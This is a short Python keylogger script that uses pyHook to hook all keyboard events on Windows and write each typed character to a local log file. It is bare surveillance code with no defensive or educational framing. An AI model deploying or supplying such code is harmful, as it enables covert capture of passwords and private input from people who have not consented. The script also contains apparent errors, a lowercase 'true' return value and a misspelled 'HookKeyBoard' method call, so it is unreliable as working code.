import pyHook
import pythoncom
import logging
import sys

path = 'C:\\Documents\\sample.txt'

def monitorKeyBoardEvent(event):
    logging.basicConfig(filename = path, level = logging.DEBUG, format = '%(message)s')
    # get the separate characters based on Ascii
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return true

manager = pyHook.HookManager()
manager.KeyDown = monitorKeyBoardEvent
manager.HookKeyBoard()
pythoncom.PumpMessages()
